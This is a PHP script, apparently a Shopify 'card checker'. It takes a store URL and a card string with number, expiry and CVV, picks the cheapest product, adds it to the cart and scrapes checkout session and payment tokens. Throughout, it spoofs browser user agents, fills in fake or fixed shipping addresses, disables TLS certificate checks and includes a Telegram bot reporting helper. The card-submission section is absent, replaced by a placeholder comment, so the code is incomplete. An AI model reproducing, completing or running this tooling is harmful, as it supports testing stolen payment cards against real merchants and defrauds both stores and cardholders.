<?php

/***************************************************************************************
 *                                                                                     *
 *   This script automates the Shopify checkout process.                               *
 *   It identifies the product with the minimum price and attempts to complete         *
 *   the checkout process seamlessly.                                                  *
 *                                                                                     *
 *   Developer: @MRBERLIN788                                                             *
 *   Contact: Telegram (@MRBERLIN788)                                                    *
 *                                                                                     *
 *   Date: 16 November 2024                                                            *
 *                                                                                     *
 ***************************************************************************************/


$maxRetries = 3;
$retryCount = 0;
require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');
start:

function generateUSAddress() {
    $statesWithZipRanges = [
        "AL" => ["Alabama", [35000, 36999]],
        "AK" => ["Alaska", [99500, 99999]],
        "AZ" => ["Arizona", [85000, 86999]],
        "AR" => ["Arkansas", [71600, 72999]],
        "CA" => ["California", [90000, 96199]],
        "CO" => ["Colorado", [80000, 81999]],
        "CT" => ["Connecticut", [6000, 6999]],
        "DE" => ["Delaware", [19700, 19999]],
        "FL" => ["Florida", [32000, 34999]],
        "GA" => ["Georgia", [30000, 31999]],
        "OK" => ["Oklahoma", [73000, 74999]],
    ];

    $stateCode = array_rand($statesWithZipRanges);
    $stateData = $statesWithZipRanges[$stateCode];
    $stateName = $stateData[0];
    $zipRange = $stateData[1];

    $zipCode = rand($zipRange[0], $zipRange[1]);

    $streets = ["Main St", "Elm St", "Park Ave", "Oak St", "Pine St"];
    $cities = ["Springfield", "Riverside", "Fairview", "Franklin", "Greenville"];

    $streetNumber = rand(1, 9999);
    $streetName = $streets[array_rand($streets)];
    $city = $cities[array_rand($cities)];

    return [
        'street' => "$streetNumber $streetName",
        'city' => $city,
        'state' => $stateCode,
        'stateName' => $stateName,
        'postcode' => str_pad($zipCode, 5, "0", STR_PAD_LEFT),
        'country' => "US"
    ];
}
function generateFakeAddress($countryCode = 'us') {
    // API URL with specified country code
    $apiUrl = "https://randomuser.me/api/?nat=$countryCode";

    // Fetch data from API
    $response = file_get_contents($apiUrl);
    if (!$response) {
        return "Failed to fetch data from the API.";
    }

    // Decode the JSON response
    $data = json_decode($response, true);

    if (isset($data['results'][0]['location'])) {
        $location = $data['results'][0]['location'];

        // Map state names to 2-letter codes (for US and AU as examples)
        $stateCodes = [
            'us' => [
                "Alabama" => "AL", "Alaska" => "AK", "Arizona" => "AZ", "Arkansas" => "AR",
                "California" => "CA", "Colorado" => "CO", "Connecticut" => "CT", "Delaware" => "DE",
                "Florida" => "FL", "Georgia" => "GA", "Hawaii" => "HI", "Idaho" => "ID",
                "Illinois" => "IL", "Indiana" => "IN", "Iowa" => "IA", "Kansas" => "KS",
                "Kentucky" => "KY", "Louisiana" => "LA", "Maine" => "ME", "Maryland" => "MD",
                "Massachusetts" => "MA", "Michigan" => "MI", "Minnesota" => "MN", "Mississippi" => "MS",
                "Missouri" => "MO", "Montana" => "MT", "Nebraska" => "NE", "Nevada" => "NV",
                "New Hampshire" => "NH", "New Jersey" => "NJ", "New Mexico" => "NM", "New York" => "NY",
                "North Carolina" => "NC", "North Dakota" => "ND", "Ohio" => "OH", "Oklahoma" => "OK",
                "Oregon" => "OR", "Pennsylvania" => "PA", "Rhode Island" => "RI", "South Carolina" => "SC",
                "South Dakota" => "SD", "Tennessee" => "TN", "Texas" => "TX", "Utah" => "UT",
                "Vermont" => "VT", "Virginia" => "VA", "Washington" => "WA", "West Virginia" => "WV",
                "Wisconsin" => "WI", "Wyoming" => "WY"
            ],
            'au' => [
                "Australian Capital Territory" => "ACT", "New South Wales" => "NSW",
                "Northern Territory" => "NT", "Queensland" => "QLD", "South Australia" => "SA",
                "Tasmania" => "TAS", "Victoria" => "VIC", "Western Australia" => "WA"
            ]
        ];

        $stateName = $location['state'];
        $stateCode = $stateCodes[$countryCode][$stateName] ?? $stateName;

        return [
            'street' => $location['street']['number'] . ' ' . $location['street']['name'],
            'city' => $location['city'],
            'state' => $stateCode,
            'postcode' => (string) $location['postcode'],
            'country' => strtoupper($countryCode)
        ];
    } else {
        return "No address found in the API response.";
    }
}
function generateRandomCoordinates($minLat = -90, $maxLat = 90, $minLon = -180, $maxLon = 180) {
    $latitude = $minLat + mt_rand() / mt_getrandmax() * ($maxLat - $minLat);
    $longitude = $minLon + mt_rand() / mt_getrandmax() * ($maxLon - $minLon);
    return [
        'latitude' => round($latitude, 6), 
        'longitude' => round($longitude, 6)
    ];
}
$randomCoordinates = generateRandomCoordinates();
$latitude = $randomCoordinates['latitude'];
$longitude = $randomCoordinates['longitude'];
function find_between($content, $start, $end) {
    $startPos = strpos($content, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) { 
        return '';
    }
    return substr($content, $startPos, $endPos - $startPos);
}
function output($method, $data) {
    $out = curl_init();

    curl_setopt_array($out, [
        CURLOPT_URL => 'https://api.telegram.org/bot<bottoken>'.$method.'',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array_merge([
            'parse_mode' => 'HTML'
        ], $data),
        CURLOPT_RETURNTRANSFER => 1
    ]);

    $result = curl_exec($out);

    curl_close($out);

    return json_decode($result, true);
}
// Arguments are passed from the command line: php index.php <site> <cc>
if ($argc < 3) {
    die(json_encode(['Response' => 'Error: Missing site and cc arguments.']));
}

$site1 = $argv[1]; // The first argument is the site URL
$cc1 = $argv[2];   // The second argument is the CC string

// The rest of your script remains the same...


$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];
/*=====  sub_month  ======*/
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception('Invalid JSON format or missing products key');
    }
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            if ($price >= 0.01) {
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    $err = 'Invalid URL';
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    $site = "$site2/products.json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Accept: application/json',
    ]);

    $r1 = curl_exec($ch);
    if ($r1 === false) {
        $err = 'Error in 1 req: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
        ]);
        echo $result;
        curl_close($ch);
        exit;
    } else {
        curl_close($ch);
        
        try {
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            $err = $e->getMessage();
            $result = json_encode([
                'Response' => $err,
            ]);
        }
    }

if (empty($minPriceProductId)) {
    $err = 'Product id is empty';
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';

// 🔥 COOKIE FILE PERMISSION CHECK
if (!file_exists($cookie)) {
    touch($cookie);
    chmod($cookie, 0777);
}

$prodid = $minPriceProductId;
cart:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: ' . $urlbase,
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);

$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);

    if (strtolower($name) === 'location') {
        $headers['Location'] = trim($value);
    }

    return strlen($headerLine);
});

$response = curl_exec($ch);
$finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'Error in 1st Req => ' . curl_error($ch);
        $result = json_encode(['Response' => $err, 'Price' => $minPrice]);
        echo $result;
        exit;
    }
}
curl_close($ch);

$keywords = [
    'stock_problems',
    'Some items in your cart are no longer available. Please update your cart.',
    'This product is currently unavailable.',
    'This item is currently out of stock but will be shipped once available.',
    'Sold Out.',
    'stock-problems'
];

$found = false;
foreach ($keywords as $keyword) {
    if (strpos($response, $keyword) !== false) {
        $found = true;
        break;
    }
}

if ($found) {
    $err = "Item is out of stock";
    $result = json_encode([
        'Response' => $err,
        'Price' => $minPrice
    ]);
    echo $result;
    exit;
}

// 🔥 IMPROVED TOKEN EXTRACTION - FIXED FOR NEW SHOPIFY FORMAT
$x_checkout_one_session_token = '';

// Method 1: New format (serialized-sessionToken) - UPDATED
if (preg_match('/<meta name="serialized-sessionToken"\s+content="&quot;(.*?)&quot;"/', $response, $matches)) {
    $x_checkout_one_session_token = $matches[1];
}

// Method 2: Old format (serialized-session-token)
if (empty($x_checkout_one_session_token)) {
    if (preg_match('/<meta name="serialized-session-token"\s+content="&quot;(.*?)&quot;"/', $response, $matches)) {
        $x_checkout_one_session_token = $matches[1];
    }
}

// Method 3: JSON data se
if (empty($x_checkout_one_session_token)) {
    if (preg_match('/"sessionToken":"(.*?)"/', $response, $matches)) {
        $x_checkout_one_session_token = $matches[1];
    }
}

// Method 4: Direct string search
if (empty($x_checkout_one_session_token)) {
    if (preg_match('/sessionToken["\']?\s*:\s*["\']([^"\']+)["\']/', $response, $matches)) {
        $x_checkout_one_session_token = $matches[1];
    }
}

// Clean the token
$x_checkout_one_session_token = trim($x_checkout_one_session_token, '"\'&quot;');

if (empty($x_checkout_one_session_token)) {
    file_put_contents('debug_' . time() . '.html', $response);
    
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = "Client Token not found - Check debug file";
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

// 🔥 QUEUE TOKEN - Multiple methods
$queue_token = '';

// Method 1
if (preg_match('/queueToken["\']?\s*:\s*["\']([^"\']+)["\']/', $response, $matches)) {
    $queue_token = $matches[1];
}

// Method 2 - original method
if (empty($queue_token)) {
    $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
}

if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'Queue Token Empty';
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$currency = find_between($response, '&quot;currencyCode&quot;:&quot;', '&quot;');
$countrycode = find_between($response, '&quot;countryCode&quot;:&quot;', '&quot;,&quot');
$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = 'Id empty';
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = 'py id empty';
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}

// 🔥 FIXED: Get checkout URL properly
$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
if (empty($checkouturl) && !empty($finalUrl)) {
    $checkouturl = $finalUrl;
}

$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}

// Address selection based on TLD
if (strpos($site1, '.us') || strpos($site1, '.com')) {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.uk')) {
    $address = [
        'street' => '11N Mary Slessor Square',
        'city' => 'Dundee',
        'state' => 'SCT',
        'postcode' => 'DD4 6BW',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.in')) {
    $address = [
        'street' => 'bhagirathpura indore',
        'city' => 'indore',
        'state' => 'MP',
        'postcode' => '452003',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.ca')) {
    $address = [
        'street' => '11n Lane Street',
        'city' => "Barry's Bay",
        'state' => 'ON',
        'postcode' => 'K0J 2M0',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.au')) {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
} else {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => 'US',
        'currency' => 'USD'
    ];
}

// Rest of your script continues exactly as before from here...
// (card section, proposal, receipt, poll sections remain the same)

card:
// ... (rest of your existing code from here onwards - no changes needed)
